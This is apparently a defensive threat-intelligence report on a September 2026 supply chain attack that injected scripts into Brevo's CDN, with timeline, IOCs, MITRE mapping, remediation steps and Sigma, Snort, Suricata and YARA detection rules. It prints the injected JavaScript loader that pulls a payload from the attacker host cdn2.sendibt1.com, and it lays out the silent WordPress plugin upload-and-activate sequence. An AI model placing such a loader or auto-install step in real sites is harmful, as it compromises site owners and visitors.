# Technical Analysis Report: Brevo Supply Chain Attack — Cloudflare Worker Injection (2026-09-21)

Prepared by: Actioner
Classification: TLP:CLEAR
Date: 2026-09-21
Version: DRAFT

## Executive Summary

On September 14, 2026 (16:05–20:13 UTC), attackers exploited a compromised Cloudflare API key — hardcoded in Brevo's source code — to deploy a malicious Cloudflare Worker that injected JavaScript into Brevo's customer-facing assets. Over 100,000 websites embedding Brevo's chat widgets, forms, or tracking scripts were affected during the ~4-hour window. The injected script delivered two payloads: (1) automatic installation of a backdoor WordPress plugin ("Web Media Optimizer," downloaded as `wm.zip`) on sites where the visitor had WordPress admin privileges, and (2) a ClickFix social engineering overlay tricking non-admin visitors into pasting malicious commands. The attacker had established infrastructure as early as August 25, 2026, when an SSL certificate for `cdn[.]sendibt1[.]com` was created. All malicious domains stopped resolving on September 15. Major Brevo customers potentially exposed include eBay, Louis Vuitton, Michelin, and Trezor.

## Background: Brevo (formerly Sendinblue)

Brevo is a major email marketing and CRM platform serving hundreds of thousands of businesses. Its services embed JavaScript widgets (chat, forms, tracking) on customer websites via CDN-hosted scripts at `cdn.brevo.com`. Brevo's infrastructure spans multiple apex domains (`brevo.com`, `sibforms.com`, `sibautomation.com`, `sendinblue.com`) all managed through a single Cloudflare DNS account, creating a single point of failure that the attacker exploited.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-08-25 17:08 | SSL certificate for `cdn[.]sendibt1[.]com` created (attacker infrastructure setup) |
| Late Aug 2026 | Compromised Cloudflare API key first misused |
| 2026-09-10 06:30 | Brevo identified SAML SSO flaw affecting 138 accounts |
| 2026-09-10 08:30 | Attacker lost SSO access via remediation |
| 2026-09-14 16:04:23 | Last clean `sdk-loader.js` observed |
| 2026-09-14 16:05:18 | Malware injection began via Cloudflare Worker deployment |
| 2026-09-14 20:12:53 | Malware injection ceased |
| 2026-09-15 | All malicious `cdn*.sendibt1.com` hosts stopped resolving (NXDOMAIN) |
| 2026-09-15 11:41 | Maltrail added `cdn9`, `cdn10`, `cdn11` to blocklist |
| 2026-09-15 17:45 | Final CSP violation report from cached copy |
| 2026-09-16 | Sansec published technical analysis |

## Root Cause: Cloudflare Account Compromise via Hardcoded API Key

The attacker gained access to Brevo's Cloudflare account through a long-lived API key that was hardcoded in Brevo's source code. This single key provided DNS write access and content rewriting capability across five Brevo apex domains. Evidence includes: (1) all five domains used a single Cloudflare DNS account, (2) the modified assets at `cdn.brevo.com` continued serving the same `Last-Modified` headers before, during, and after the incident — consistent with Cloudflare Worker content rewriting rather than origin file modification, and (3) the attacker registered `sendibt1.com` through the same Cloudflare account, with only attacker-created `cdn*` subdomains being Cloudflare-proxied while the apex resolved to a non-Cloudflare IP (`172.246.243.65`, AS200484).

## Technical Analysis of the Malicious Payload

### 1. Cloudflare Worker Injection (Initial Vector)

The attacker deployed a Cloudflare Worker that intercepted responses for Brevo's CDN-hosted JavaScript files and injected a script loader. The Worker also stripped Content-Security-Policy headers to prevent violation alerts. Affected assets:

- `hxxps://cdn[.]brevo[.]com/js/sdk-loader.js`
- `hxxps://cdn[.]brevo[.]com/js/brevo-conversations.js`
- `hxxps://conversations-widget[.]brevo[.]com/brevo-conversations.js`
- Forms hosted on `sibforms[.]com`

The injected code appended a script element loading the main payload:

```javascript
(function () {
  var s = document.createElement("script");
  s.src = "https://cdn2.sendibt1.com/f.js";
  s.async = true;
  var h = document.head || document.documentElement;
  h.appendChild(s);
})();
```

### 2. Dual-Function Payload (f.js)

The `f.js` loader from `cdn9[.]sendibt1[.]com` implemented conditional logic based on the visitor's WordPress admin status:

**WordPress Plugin Backdoor (Admin Visitors):** If the visitor was logged into `wp-admin`, the script silently installed a backdoor plugin by:
- Downloading `wm.zip` ("Web Media Optimizer") from `hxxps://cdn10[.]sendibt1[.]com/p/wm.zip`
- POSTing to `/wp-admin/update.php?action=upload-plugin`
- Activating via `/wp-admin/plugins.php?action=activate`
- The plugin hid itself from the WordPress admin plugins list and persisted via the `mu-plugins` (must-use plugins) folder

**ClickFix Social Engineering (Non-Admin Visitors):** For regular visitors, the script displayed a full-page "verify you are human" overlay that directed users to copy-paste malicious commands into their terminal/Run dialog.

### 3. C2 Infrastructure

The attacker operated C2 through multiple subdomains of `sendibt1[.]com`:

| Endpoint | Function |
|----------|----------|
| `/api/v1/0044d4a` | Fingerprint POST (visitor profiling) |
| `/api/v1/e08a3c4` | Proof-of-work token retrieval |
| `/api/v1/8e4c615` | Alternate fingerprint POST (cdn3 variant) |
| `/api/v1/f659473` | Alternate proof-of-work token (cdn3 variant) |
| `/api/v1/4aff112?tk=` | Clipboard command delivery |
| `/api/v1/b832c14?e=` | Event beacon (click, copy, fallback, failure, close) |
| `/api/v1/4ead0ff?tk=` | Image beacon |
| `/image.php?tk=` | Image beacon (alternate) |

The C2 used a cloaking mechanism returning a specific response (SHA256: `4af488d79aef7daa12b1c18f0cce28b7edadccb8b6b0fb8d50d1d53a9a7c2df7`) to evade automated analysis.

### 4. Anti-Forensics / Evasion Techniques

- **CSP header stripping:** The Cloudflare Worker removed Content-Security-Policy headers to suppress browser violation reports
- **Bot/crawler avoidance:** The payload deactivated for web crawlers, developers, and automated scanners
- **Plugin cloaking:** The WordPress backdoor plugin hid itself from the admin plugins listing
- **Short attack window:** The 4-hour injection window minimized detection time
- **Kit fingerprinting:** Used `script[src*="file.js"]` and `script[data-c]` as self-location selectors

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`)

### Package / Software Level

| Package / Component | Malicious Version | Description |
|---------------------|-------------------|-------------|
| sdk-loader.js | Injected via Worker | Brevo SDK loader with appended script injection code |
| brevo-conversations.js | Injected via Worker | Brevo chat widget with appended script injection code |
| Web Media Optimizer (wm.zip) | Backdoor plugin | WordPress plugin installed silently; hides from admin UI |

### File System

| Platform | Path / File | Hash (SHA256) | Description |
|----------|-------------|---------------|-------------|
| Web | sdk-loader.js (clean) | fe8447fd1ec4dca652b71db2c749fcc24a5bec3875f3654042169fb2418aed09 | Clean version for comparison |
| Web | sdk-loader.js (injected, cdn2) | 58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308 | Injected variant loading cdn2 |
| Web | sdk-loader.js (injected, cdn11) | f67d572d2d30407b3f470904326411450763108980cdad89550fbb221fb06782 | Injected variant loading cdn11 |
| Web | brevo-conversations.js (clean) | 26166cd87ff07e7a50317a24126d14b262e842c5715585636dee3ab3f227ddca | Clean version for comparison |
| Web | brevo-conversations.js (injected, cdn4) | 9b62c12bc5c7feb9802f58e6cf75a368690df3c754e37cc64483a92acacf87a5 | Injected variant loading cdn4 |
| Web | C2 cloak response | 4af488d79aef7daa12b1c18f0cce28b7edadccb8b6b0fb8d50d1d53a9a7c2df7 | C2 cloaking response body |

### Network

| Type | Value | Context |
|------|-------|---------|
| Domain | cdn[.]sendibt1[.]com | Primary C2 / script delivery |
| Domain | cdn2[.]sendibt1[.]com | Script injection source |
| Domain | cdn3[.]sendibt1[.]com | Alternate C2 |
| Domain | cdn4[.]sendibt1[.]com | Script injection source |
| Domain | cdn9[.]sendibt1[.]com | Main loader delivery (f.js) |
| Domain | cdn10[.]sendibt1[.]com | WordPress plugin download |
| Domain | cdn11[.]sendibt1[.]com | Script injection source |
| IP | 104.21.77[.]104 | Cloudflare-proxied IP for cdn[.]sendibt1[.]com |
| IP | 188.114.97[.]3 | Cloudflare-proxied IP for cdn9[.]sendibt1[.]com |
| URL | hxxps://cdn9[.]sendibt1[.]com/f.js | Main malicious loader |
| URL | hxxps://cdn10[.]sendibt1[.]com/p/wm.zip | WordPress backdoor plugin download |
| URL | /api/v1/0044d4a | Fingerprint POST endpoint |
| URL | /api/v1/e08a3c4 | Proof-of-work token endpoint |
| URL | /api/v1/8e4c615 | Alternate fingerprint endpoint |
| URL | /api/v1/f659473 | Alternate token endpoint |
| URL | /api/v1/4aff112?tk= | Clipboard command delivery |
| URL | /api/v1/b832c14?e= | Event beacon |
| URL | /api/v1/4ead0ff?tk= | Image beacon |
| URL | /image.php?tk= | Image beacon (alternate) |

### Behavioral

- JavaScript dynamically creates `<script>` elements loading from `cdn*.sendibt1.com` subdomains
- WordPress plugin upload and activation via POST to `/wp-admin/update.php?action=upload-plugin` followed by GET to `/wp-admin/plugins.php?action=activate` — without user interaction
- Self-location detection via `script[src*="file.js"]` and `script[data-c]` CSS selectors
- Proof-of-work challenge/response pattern via sequential API calls to `/api/v1/` endpoints
- Event beaconing for click, copy, fallback, failure, and close events

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1195.002 | Supply Chain Compromise: Compromise Software Supply Chain | Attacker compromised Brevo's Cloudflare account to inject malicious code into CDN-hosted JavaScript loaded by 100,000+ customer websites |
| T1189 | Drive-by Compromise | Visitors to affected websites were served malicious JavaScript payloads without any interaction |
| T1059.007 | Command and Scripting Interpreter: JavaScript | Injected JavaScript executed in victim browsers to install plugins and display overlays |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 communication via HTTPS API endpoints on sendibt1.com subdomains |
| T1105 | Ingress Tool Transfer | Backdoor WordPress plugin (wm.zip) downloaded from cdn10[.]sendibt1[.]com |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Plugin named "Web Media Optimizer" to appear legitimate |
| T1564.001 | Hide Artifacts: Hidden Files and Directories | WordPress plugin hid itself from the admin plugins listing |
| T1115 | Clipboard Data | ClickFix overlay manipulated clipboard to deliver malicious commands |
| T1204.001 | User Execution: Malicious Link | Social engineering overlay tricked users into pasting and executing commands |
| T1592.004 | Gather Victim Host Information: Client Configurations | Fingerprinting via POST to C2 API endpoints |

## Impact Assessment

- **Breadth:** Over 100,000 websites affected; Brevo customers include Fortune 500 companies (eBay, Louis Vuitton, Michelin) and cryptocurrency firms (Trezor)
- **Depth:** WordPress sites with logged-in admins received persistent backdoor; non-admin visitors exposed to ClickFix command execution
- **Stealth:** CSP headers stripped, bot detection bypass, plugin self-hiding; Sansec's CSP monitor captured 2,549 violation reports across 12 monitored sites
- **Exposure window:** 4 hours 7 minutes of active injection (Sep 14 16:05–20:13 UTC), but cached copies continued serving until Sep 15 17:45

## Detection & Remediation

### Immediate Detection

- **Web server logs:** Search access logs for `POST /wp-admin/update.php` with `action=upload-plugin` on September 14, 2026, followed by `GET /wp-admin/plugins.php?action=activate`
- **WordPress filesystem:** Compare installed plugins on disk against the WordPress admin plugin listing — the backdoor plugin hides from the UI
- **WordPress `mu-plugins`:** Check the `wp-content/mu-plugins/` directory for unexpected files (backdoor persists here)
- **DNS/proxy logs:** Search for any resolution or connection to `sendibt1.com` or its subdomains
- **CSP reports:** Review Content-Security-Policy violation logs for `sendibt1.com` references

### Remediation

1. **Block** all `sendibt1.com` domains at DNS/proxy/firewall level (domains are now NXDOMAIN but may return)
2. **Audit** WordPress plugin directories: remove any unrecognized plugins especially in `mu-plugins`, with install dates around Sep 14
3. **Rotate** all WordPress admin credentials for affected sites
4. **Scan** endpoint machines of users who visited affected sites during the window for ClickFix-delivered malware
5. **Verify** Brevo JavaScript integrity: compare current file hashes against known-clean versions
6. **Review** Subresource Integrity (SRI) tags for all third-party scripts

### Long-Term Hardening

- Implement Subresource Integrity (SRI) for all third-party embedded scripts
- Deploy Content-Security-Policy headers with strict `script-src` directives
- Audit and rotate all API keys, especially those with broad infrastructure access
- Remove hardcoded credentials from source code; use secrets management
- Implement monitoring for Cloudflare Worker deployments and DNS zone changes
- Consider vendor risk assessment for SaaS providers with embedded JavaScript

## Detection Rules

These detections target the Brevo supply chain attack's network indicators and host-level artifacts. PoC/advisory-specific altitude (default); rules key on the attacker's distinctive `sendibt1.com` infrastructure and specific C2 API paths. All Sigma rules convert to Splunk and CrowdStrike LogScale; `sigma check` was unable to run (MITRE ATT&CK data unreachable from this environment) but conversion to both backends exited 0.

### Sigma: HTTP Request to Brevo Supply Chain C2 Domain

Detects proxy/web log requests to `sendibt1.com` subdomains used as C2 infrastructure.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check blocked by MITRE data fetch 403; splunk convert exit 0; log_scale convert exit 0. Domain is attacker-registered, no legitimate use expected. FP risk: near-zero. -->
```yaml
title: HTTP Request to Brevo Supply Chain C2 Domain sendibt1.com
id: 3c7e8a4b-f1d2-4e5a-9b6c-2d8f0a1e3c7b
status: experimental
description: >
    Detects HTTP requests to sendibt1.com subdomains used as C2 infrastructure
    in the Brevo supply chain attack (Sep 2026). The attacker deployed a
    Cloudflare Worker injecting scripts from cdn*.sendibt1.com into customer
    websites, serving a WordPress backdoor and ClickFix social engineering overlay.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026/09/21
tags:
    - attack.t1195.002
    - attack.t1189
logsource:
    category: proxy
detection:
    selection:
        cs-host|endswith: '.sendibt1.com'
    condition: selection
falsepositives:
    - Legitimate use of sendibt1.com is unlikely; domain was registered by the attacker
level: high
```

### Sigma: DNS Query to Brevo Supply Chain C2 Domain

Detects DNS resolution attempts for `sendibt1.com` subdomains used in the attack.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check blocked by MITRE data fetch 403; splunk convert exit 0; log_scale convert exit 0. Attacker-owned domain, zero expected FP. -->
```yaml
title: DNS Query to Brevo Supply Chain C2 Domain sendibt1.com
id: b5e6c7d8-2a3f-4b1e-9c8d-3f7a0e1b4d5c
status: experimental
description: >
    Detects DNS resolution attempts for sendibt1.com subdomains used as
    C2 infrastructure in the Brevo supply chain attack. The attacker used
    cdn, cdn2-cdn4, cdn9-cdn11 subdomains for script delivery, plugin
    download, and C2 beacon communication.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026/09/21
tags:
    - attack.t1195.002
    - attack.t1071.001
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith: '.sendibt1.com'
    condition: selection
falsepositives:
    - None expected; sendibt1.com was attacker-controlled infrastructure
level: high
```

### Sigma: WordPress Plugin Upload via Brevo Supply Chain Injection

Detects WordPress plugin upload with `sendibt1.com` referer, matching the automated backdoor installation pattern.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check blocked by MITRE data fetch 403; splunk convert exit 0; log_scale convert exit 0. Requires webserver logs with referer field. The sendibt1.com referer anchor makes this high-confidence. -->
```yaml
title: WordPress Plugin Upload via Brevo Supply Chain Injection
id: a8d4f2e1-6b3c-4a9e-8d7f-1c5e0b2a3d6f
status: experimental
description: >
    Detects WordPress plugin upload requests with a referer containing
    sendibt1.com, consistent with the Brevo supply chain attack where
    injected JavaScript automatically installed a backdoor plugin on
    sites where the visitor had WordPress administrator privileges.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026/09/21
tags:
    - attack.t1195.002
    - attack.t1059.007
logsource:
    category: webserver
detection:
    selection:
        cs-method: 'POST'
        cs-uri-stem|contains: '/wp-admin/update.php'
        cs-uri-query|contains: 'action=upload-plugin'
        cs-referer|contains: 'sendibt1.com'
    condition: selection
falsepositives:
    - Legitimate WordPress plugin installation from admin UI will not have sendibt1.com in the referer
level: critical
```

### Snort: HTTP C2 Request to sendibt1.com API Path

Detects outbound HTTP requests to `sendibt1.com` C2 API endpoints used for fingerprinting and beaconing.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort -T exit 0 with classification.config. Rules use http_header for Host match and http_uri for path match. Snort 2.9 syntax. -->
```snort
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - Brevo Supply Chain C2 HTTP Request to sendibt1.com API Path"; flow:established,to_server; content:"/api/v1/"; http_uri; content:"sendibt1.com"; http_header; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; sid:2100101; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - Brevo Supply Chain Malicious JS Loader f.js Download"; flow:established,to_server; content:"/f.js"; http_uri; content:"sendibt1.com"; http_header; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; sid:2100102; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - Brevo Supply Chain WordPress Backdoor Plugin Download wm.zip"; flow:established,to_server; content:"/p/wm.zip"; http_uri; content:"sendibt1.com"; http_header; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; sid:2100103; rev:1;)
```

### Suricata: DNS Query to sendibt1.com

Detects DNS queries for any `sendibt1.com` subdomain used in the attack infrastructure.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. dns.query sticky buffer with nocase. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - DNS Query to Brevo Supply Chain C2 Domain sendibt1.com"; flow:to_server; dns.query; content:"sendibt1.com"; nocase; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-21; sid:2200101; rev:1;)
```

### Suricata: TLS SNI to sendibt1.com

Detects TLS Client Hello with SNI containing `sendibt1.com`, catching encrypted connections to attacker infrastructure.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. tls.sni sticky buffer. -->
```suricata
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - TLS SNI to Brevo Supply Chain C2 Domain sendibt1.com"; flow:established,to_server; tls.sni; content:"sendibt1.com"; nocase; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-21; sid:2200102; rev:1;)
```

### Suricata: HTTP Request to sendibt1.com C2 Endpoints

Detects HTTP traffic to `sendibt1.com` C2 API paths and malicious file downloads.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0. Removed nocase from http.host (already normalized). fast_pattern on http.uri. -->
```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - HTTP Request to Brevo Supply Chain C2 API Endpoint"; flow:established,to_server; http.host; content:"sendibt1.com"; http.uri; content:"/api/v1/"; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-21; sid:2200103; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - HTTP Download of Brevo Supply Chain Malicious JS Loader"; flow:established,to_server; http.host; content:"sendibt1.com"; http.uri; content:"/f.js"; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-21; sid:2200104; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - HTTP Download of Brevo Supply Chain WordPress Backdoor wm.zip"; flow:established,to_server; http.host; content:"sendibt1.com"; http.uri; content:"/p/wm.zip"; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-21; sid:2200105; rev:1;)
```

### YARA: Brevo Supply Chain Injected JavaScript Detection

Detects JavaScript files containing `sendibt1.com` domain references combined with injection patterns or C2 paths characteristic of the Brevo supply chain attack payloads.
**Status:** compile ✅ compiles · confidence: high · sample: fired ✓
<!-- audit: yarac exit 0. Positive test (cdn2.sendibt1.com + createElement) fired both rules; negative test (clean brevo cdn URL) silent. Condition requires domain + injection/C2 pattern co-occurrence for the first rule; the second rule is a broad domain-only sweep. -->
```yara
rule Supply_Chain_Brevo_Injected_JS
{
    meta:
        description = "Detects JavaScript files injected during the Brevo supply chain attack via Cloudflare Worker (Sep 2026)"
        author = "Actioner"
        date = "2026-09-21"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"
        hash1 = "58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308"
        hash2 = "f67d572d2d30407b3f470904326411450763108980cdad89550fbb221fb06782"
        hash3 = "9b62c12bc5c7feb9802f58e6cf75a368690df3c754e37cc64483a92acacf87a5"
        severity = "high"

    strings:
        $domain1 = "cdn.sendibt1.com" ascii wide
        $domain2 = "cdn2.sendibt1.com" ascii wide
        $domain3 = "cdn3.sendibt1.com" ascii wide
        $domain4 = "cdn4.sendibt1.com" ascii wide
        $domain9 = "cdn9.sendibt1.com" ascii wide
        $domain10 = "cdn10.sendibt1.com" ascii wide
        $domain11 = "cdn11.sendibt1.com" ascii wide
        $loader_url = "/f.js" ascii
        $wp_path = "/wp-admin/update.php" ascii
        $wp_action = "action=upload-plugin" ascii
        $plugin_zip = "/p/wm.zip" ascii
        $c2_path1 = "/api/v1/0044d4a" ascii
        $c2_path2 = "/api/v1/e08a3c4" ascii
        $c2_path3 = "/api/v1/4aff112" ascii
        $c2_path4 = "/api/v1/b832c14" ascii
        $c2_path5 = "/api/v1/4ead0ff" ascii
        $c2_path6 = "/api/v1/8e4c615" ascii
        $c2_path7 = "/api/v1/f659473" ascii
        $inject_pattern = "document.createElement(\"script\")" ascii
        $self_selector = "script[data-c]" ascii

    condition:
        filesize < 5MB and
        (
            (1 of ($domain*) and ($loader_url or $inject_pattern or $self_selector)) or
            (1 of ($domain*) and 1 of ($c2_path*)) or
            (1 of ($domain*) and ($wp_path or $wp_action or $plugin_zip)) or
            (2 of ($c2_path*) and 1 of ($domain*))
        )
}

rule Supply_Chain_Brevo_Sendibt1_Reference
{
    meta:
        description = "Detects files referencing the attacker-controlled sendibt1.com domain used in the Brevo supply chain attack"
        author = "Actioner"
        date = "2026-09-21"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"
        hash1 = "58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308"
        hash2 = "f67d572d2d30407b3f470904326411450763108980cdad89550fbb221fb06782"
        hash3 = "9b62c12bc5c7feb9802f58e6cf75a368690df3c754e37cc64483a92acacf87a5"
        hash4 = "4af488d79aef7daa12b1c18f0cce28b7edadccb8b6b0fb8d50d1d53a9a7c2df7"
        severity = "high"

    strings:
        $sendibt1 = "sendibt1.com" ascii wide nocase

    condition:
        filesize < 5MB and $sendibt1
}
```

## Lessons Learned

1. **Hardcoded API keys are a critical supply chain risk.** A single long-lived Cloudflare API key in source code gave the attacker DNS write access and edge content rewriting across five domains, affecting over 100,000 downstream websites.

2. **Third-party JavaScript is a trust boundary.** Websites embedding vendor JavaScript inherit the vendor's entire attack surface. Subresource Integrity (SRI) and strict CSP would have detected or prevented the injected content.

3. **Cloudflare Workers create an invisible injection point.** The Worker modified content at the edge without changing origin files, meaning traditional file integrity monitoring missed the attack. The `Last-Modified` header remained unchanged throughout.

4. **Supply chain attacks maximize blast radius.** A 4-hour window affecting a single vendor's CDN scripts reached 100,000+ websites — including major global brands — demonstrating why supply chain compromise is a top-priority threat vector.

## Sources

- [Sansec Research: Brevo Supply Chain Attack](https://sansec.io/research/brevo-supply-chain-attack) — Primary technical analysis with full IOCs, timeline, attack mechanism, and forensic evidence
- [SecurityWeek: Brevo Supply Chain Attack Injects Malware Into 100,000+ Websites](https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/) — News coverage with additional context on Cloudflare API key compromise
- [Security Affairs: Brevo Supply Chain Attack Infected Over 100,000 Websites](https://securityaffairs.com/199355/hacking/brevo-supply-chain-attack-infected-over-100000-websites.html) — Additional reporting with remediation details and affected organization context

---
*Report generated by Actioner*
